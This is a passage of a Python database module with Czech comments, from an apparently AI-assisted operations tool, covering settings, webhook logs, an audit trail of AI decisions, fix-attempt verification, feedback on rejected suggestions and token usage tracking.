            conn.close()
        except Exception as e:
            logger.error(f"delete_user_role: {e}")

def get_setting(key: str, default=None):
    try:
        conn = _get_conn()
        row = conn.execute("SELECT value FROM kv_settings WHERE key=?", (key,)).fetchone()
        conn.close()
        return row[0] if row else default
    except Exception as e:
        logger.error(f"get_setting: {e}")
        return default

def set_setting(key: str, value: str):
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute(
                "INSERT INTO kv_settings(key, value, updated_at) VALUES(?,?,datetime('now')) "
                "ON CONFLICT(key) DO UPDATE SET value=excluded.value, updated_at=excluded.updated_at",
                (key, value)
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"set_setting: {e}")

def log_webhook_delivery(url: str, event: str, status_code=None, ok: bool = False,
                         latency_ms=None, error: str = ''):
    """406: Zaznamená outbound webhook doručení (max 500 záznamů)."""
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute(
                "INSERT INTO webhook_deliveries (url, event, status_code, ok, latency_ms, error) "
                "VALUES (?,?,?,?,?,?)",
                (url[:300], event[:60], status_code, 1 if ok else 0, latency_ms, error[:200])
            )
            conn.execute(
                "DELETE FROM webhook_deliveries WHERE id NOT IN "
                "(SELECT id FROM webhook_deliveries ORDER BY id DESC LIMIT 500)"
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.debug(f"log_webhook_delivery: {e}")

def get_webhook_deliveries(limit: int = 100) -> list:
    try:
        conn = _get_conn()
        rows = conn.execute(
            "SELECT url, event, status_code, ok, latency_ms, error, created_at "
            "FROM webhook_deliveries ORDER BY id DESC LIMIT ?", (limit,)
        ).fetchall()
        conn.close()
        cols = ['url', 'event', 'status_code', 'ok', 'latency_ms', 'error', 'created_at']
        return [dict(zip(cols, r)) for r in rows]
    except Exception as e:
        logger.error(f"get_webhook_deliveries: {e}")
        return []

_AUDIT_COLS = ['id', 'kind', 'model', 'problem_key', 'host', 'prompt', 'response',
               'outcome', 'executed', 'suspicious', 'username', 'created_at']

# Prompty i odpovědi umí být dlouhé; ukládáme jen tolik, aby šlo rozhodnutí
# zpětně pochopit, ne aby DB rostla donekonečna.
_AUDIT_PROMPT_MAX = 4000
_AUDIT_RESPONSE_MAX = 4000


def record_ai_decision(kind: str, prompt: str = '', response: str = '', model: str = '',
                       problem_key: str = '', host: str = '', outcome: str = '',
                       executed: bool = False, suspicious: bool = False,
                       username: str = '') -> int | None:
    """545: Zapíše, co model dostal, co vrátil a co se z toho stalo."""
    with db_lock:
        try:
            conn = _get_conn()
            cur = conn.execute(
                "INSERT INTO ai_audit (kind, model, problem_key, host, prompt, response, "
                "outcome, executed, suspicious, username) VALUES (?,?,?,?,?,?,?,?,?,?)",
                (str(kind)[:32], str(model)[:64], str(problem_key)[:200], str(host)[:100],
                 str(prompt or '')[:_AUDIT_PROMPT_MAX], str(response or '')[:_AUDIT_RESPONSE_MAX],
                 str(outcome)[:500], 1 if executed else 0, 1 if suspicious else 0,
                 str(username)[:64]))
            conn.commit()
            rid = cur.lastrowid
            conn.close()
            return rid
        except Exception as e:
            logger.error(f"record_ai_decision: {e}")
            return None


def update_ai_decision(audit_id: int, outcome: str = '', executed: bool | None = None) -> bool:
    """545: Doplní, jak rozhodnutí dopadlo (zásah se děje až po zápisu)."""
    with db_lock:
        try:
            conn = _get_conn()
            if executed is None:
                conn.execute("UPDATE ai_audit SET outcome=? WHERE id=?",
                             (str(outcome)[:500], int(audit_id)))
            else:
                conn.execute("UPDATE ai_audit SET outcome=?, executed=? WHERE id=?",
                             (str(outcome)[:500], 1 if executed else 0, int(audit_id)))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"update_ai_decision: {e}")
            return False


def get_ai_audit(kind: str = '', problem_key: str = '', limit: int = 50,
                 only_executed: bool = False) -> list:
    """545: Dohledání AI rozhodnutí."""
    try:
        where, params = [], []
        if kind:
            where.append("kind=?"); params.append(str(kind))
        if problem_key:
            where.append("problem_key=?"); params.append(str(problem_key))
        if only_executed:
            where.append("executed=1")
        clause = (" WHERE " + " AND ".join(where)) if where else ""
        params.append(int(limit))
        conn = _get_conn()
        try:
            rows = conn.execute(
                f"SELECT {','.join(_AUDIT_COLS)} FROM ai_audit{clause} "
                "ORDER BY id DESC LIMIT ?", params).fetchall()
        finally:
            conn.close()
        return [dict(zip(_AUDIT_COLS, r)) for r in rows]
    except Exception as e:
        logger.error(f"get_ai_audit: {e}")
        return []


def prune_ai_audit(days: int = 90) -> int:
    """545: Audit se nemá hromadit donekonečna."""
    with db_lock:
        try:
            conn = _get_conn()
            cur = conn.execute("DELETE FROM ai_audit WHERE created_at < datetime('now', ?)",
                               (f'-{int(days)} days',))
            conn.commit()
            n = cur.rowcount
            conn.close()
            return n
        except Exception as e:
            logger.error(f"prune_ai_audit: {e}")
            return 0


_FIX_COLS = ['id', 'problem_key', 'host', 'plugin_name', 'command', 'applied_by',
             'applied_at', 'verify_after', 'status', 'verdict_detail', 'verified_at']


def record_fix_attempt(problem_key: str, command: str, host: str = '',
                       plugin_name: str = '', applied_by: str = '',
                       wait_min: int | None = None) -> int | None:
    """486: Zaznamená zásah, který se má později ověřit. Vrací id pokusu."""
    from . import fix_verify
    from datetime import datetime, timezone
    with db_lock:
        try:
            conn = _get_conn()
            cur = conn.execute(
                "INSERT INTO fix_attempts (problem_key, host, plugin_name, command, "
                "applied_by, applied_at, verify_after) VALUES (?,?,?,?,?,?,?)",
                (str(problem_key)[:200], str(host)[:100], str(plugin_name)[:100],
                 str(command)[:1000], str(applied_by)[:64],
                 datetime.now(timezone.utc).isoformat(), fix_verify.wait_until(wait_min))
            )
            conn.commit()
            rid = cur.lastrowid
            conn.close()
            return rid
        except Exception as e:
            logger.error(f"record_fix_attempt: {e}")
            return None


def get_pending_fix_attempts(limit: int = 100) -> list:
    """486: Pokusy čekající na vyhodnocení."""
    try:
        conn = _get_conn()
        try:
            rows = conn.execute(
                f"SELECT {','.join(_FIX_COLS)} FROM fix_attempts "
                "WHERE status='pending' ORDER BY verify_after LIMIT ?", (int(limit),)
            ).fetchall()
        finally:
            conn.close()
        return [dict(zip(_FIX_COLS, r)) for r in rows]
    except Exception as e:
        logger.error(f"get_pending_fix_attempts: {e}")
        return []


def get_fix_attempts(problem_key: str = '', limit: int = 50) -> list:
    """486: Historie zásahů — pro konkrétní issue, nebo poslední napříč."""
    try:
        conn = _get_conn()
        try:
            if problem_key:
                rows = conn.execute(
                    f"SELECT {','.join(_FIX_COLS)} FROM fix_attempts "
                    "WHERE problem_key=? ORDER BY id DESC LIMIT ?",
                    (str(problem_key), int(limit))).fetchall()
            else:
                rows = conn.execute(
                    f"SELECT {','.join(_FIX_COLS)} FROM fix_attempts "
                    "ORDER BY id DESC LIMIT ?", (int(limit),)).fetchall()
        finally:
            conn.close()
        return [dict(zip(_FIX_COLS, r)) for r in rows]
    except Exception as e:
        logger.error(f"get_fix_attempts: {e}")
        return []


def close_fix_attempt(attempt_id: int, status: str, detail: str = '') -> bool:
    """486: Uzavře pokus verdiktem.

    Podmínka `status='pending'` brání dvojímu vyhodnocení, kdyby se souběžně
    trefil scheduler i ruční ověření z UI.
    """
    from datetime import datetime, timezone
    with db_lock:
        try:
            conn = _get_conn()
            cur = conn.execute(
                "UPDATE fix_attempts SET status=?, verdict_detail=?, verified_at=? "
                "WHERE id=? AND status='pending'",
                (str(status)[:16], str(detail)[:500],
                 datetime.now(timezone.utc).isoformat(), int(attempt_id)))
            conn.commit()
            changed = cur.rowcount
            conn.close()
            return changed > 0
        except Exception as e:
            logger.error(f"close_fix_attempt: {e}")
            return False


def _suggestion_hash(text: str) -> str:
    """Otisk návrhu pro porovnání „tohle už jednou odmítli"."""
    import hashlib
    norm = ' '.join(str(text or '').lower().split())
    return hashlib.sha256(norm.encode()).hexdigest()[:24] if norm else ''


def record_ai_feedback(kind: str, rating: str, suggestion: str = '', problem_key: str = '',
                       plugin_name: str = '', host: str = '', reason: str = '',
                       username: str = '') -> bool:
    """526/527: Uloží hodnocení AI odpovědi nebo zamítnutí návrhu."""
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute(
                "INSERT INTO ai_feedback (kind, rating, problem_key, plugin_name, host, "
                "suggestion, suggestion_hash, reason, username) VALUES (?,?,?,?,?,?,?,?,?)",
                (str(kind)[:32], str(rating)[:16], str(problem_key)[:200],
                 str(plugin_name)[:100], str(host)[:100], str(suggestion)[:1000],
                 _suggestion_hash(suggestion), str(reason)[:500], str(username)[:64])
            )
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"record_ai_feedback: {e}")
            return False


def was_suggestion_rejected(suggestion: str, plugin_name: str = '') -> dict | None:
    """527: Byl tenhle návrh už odmítnut? Vrací poslední zamítnutí nebo None.

    Porovnává se otisk normalizovaného textu, takže drobné rozdíly ve formátu
    (mezery, velikost písmen) nezpůsobí, že se návrh bude nabízet znovu.
    """
    h = _suggestion_hash(suggestion)
    if not h:
        return None
    try:
        conn = _get_conn()
        try:
            row = conn.execute(
                "SELECT reason, username, created_at, COUNT(*) FROM ai_feedback "
                "WHERE suggestion_hash=? AND rating IN ('down','rejected') "
                "AND (?='' OR plugin_name=?) "
                "GROUP BY suggestion_hash ORDER BY created_at DESC LIMIT 1",
                (h, plugin_name or '', plugin_name or '')
            ).fetchone()
        finally:
            conn.close()
        if not row:
            return None
        return {"reason": row[0], "by": row[1], "at": row[2], "times": row[3]}
    except Exception as e:
        logger.debug(f"was_suggestion_rejected: {e}")
        return None


def get_ai_feedback_stats(days: int = 30) -> dict:
    """526: Souhrn kvality AI — kolik odpovědí bylo užitečných."""
    try:
        conn = _get_conn()
        try:
            rows = conn.execute(
                "SELECT kind, rating, COUNT(*) FROM ai_feedback "
                "WHERE created_at > datetime('now', ?) GROUP BY kind, rating",
                (f'-{int(days)} days',)
            ).fetchall()
            recent = conn.execute(
                "SELECT kind, rating, host, plugin_name, substr(suggestion,1,120), "
                "reason, username, created_at FROM ai_feedback "
                "ORDER BY id DESC LIMIT 20"
            ).fetchall()
        finally:
            conn.close()
    except Exception as e:
        logger.error(f"get_ai_feedback_stats: {e}")
        return {"by_kind": {}, "totals": {}, "recent": []}

    by_kind: dict = {}
    totals: dict = {}
    for kind, rating, cnt in rows:
        by_kind.setdefault(kind, {})[rating] = cnt
        totals[rating] = totals.get(rating, 0) + cnt
    good = totals.get('up', 0) + totals.get('applied', 0)
    bad = totals.get('down', 0) + totals.get('rejected', 0)
    cols = ['kind', 'rating', 'host', 'plugin_name', 'suggestion', 'reason', 'username', 'created_at']
    return {
        "by_kind": by_kind, "totals": totals, "days": days,
        "useful_pct": round(good / (good + bad) * 100, 1) if (good + bad) else None,
        "recent": [dict(zip(cols, r)) for r in recent],
    }


_token_stats_lock = threading.Lock()

def record_token_usage(tokens_in: int, tokens_out: int):
    """435: Přičte AI tokeny do denní statistiky (kv_settings 'ai_token_stats', 30 dní).
    Sdíleno mezi chat_service.execute_ollama a ollama_service queue workerem."""
    if not (tokens_in or tokens_out):
        return
    with _token_stats_lock:
        try:
            raw = get_setting('ai_token_stats')
            stats = json.loads(raw) if raw else {}
            today = datetime.now().strftime('%Y-%m-%d')
            day = stats.setdefault(today, {"in": 0, "out": 0, "requests": 0})
            day["in"] += int(tokens_in)
            day["out"] += int(tokens_out)
            day["requests"] += 1
            for k in sorted(stats)[:-30]:
                del stats[k]
            set_setting('ai_token_stats', json.dumps(stats))
        except Exception as e:
            logger.debug(f"record_token_usage: {e}")
